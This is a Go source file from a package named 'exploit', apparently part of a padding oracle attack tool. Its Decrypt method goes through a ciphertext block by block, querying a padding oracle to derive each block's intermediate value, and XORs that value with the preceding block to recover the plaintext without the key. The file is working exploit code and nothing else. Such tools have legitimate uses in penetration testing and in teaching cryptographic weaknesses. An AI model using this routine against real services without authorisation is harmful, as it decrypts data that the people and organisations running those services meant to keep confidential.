package exploit

import "fmt"

func (p *Padre) Decrypt(ciphertext []byte, byteStream chan byte) ([]byte, error) {
	blockLen := p.BlockLen

	// check length of ciphertext against block length
	if len(ciphertext)%blockLen != 0 {
		return nil, fmt.Errorf("Ciphertext length is not compatible with block length (%d %% %d != 0)", len(ciphertext), blockLen)
	}

	// confirm validity of provided cipher
	pe, err := p.IsPaddingErrorInChunk(ciphertext)
	if err != nil {
		return nil, err
	}
	if pe {
		return nil, fmt.Errorf("Input cipher produced a padding error. You must provide a valid cipher to decrypt")
	}

	// count blocks
	blockCount := len(ciphertext) / blockLen

	// derive length of plaintext
	// NOTE: first block considered to be IV
	plainLen := len(ciphertext) - blockLen
	plainText := make([]byte, plainLen)

	// decrypt block by block moving backwards, except first (IV)
	for blockNum := blockCount; blockNum >= 2; blockNum-- {
		// mark indexes
		x := (blockNum - 2) * blockLen
		y := (blockNum - 1) * blockLen
		z := blockNum * blockLen

		// get cipher block and corresponding IV from ciphertext
		IV, block := ciphertext[x:y], ciphertext[y:z]

		// derive the nulling IV for the block
		nullingIV, err := p.breakCipher(block, byteStream) // createXORingFetcher(IV))
		if err != nil {
			return nil, fmt.Errorf("error occurred while decrypting block %d: %w", blockNum, err)
		}

		// derive plaintext block
		copy(plainText[x:y], xorSlices(nullingIV, IV))
	}

	return plainText, nil
}
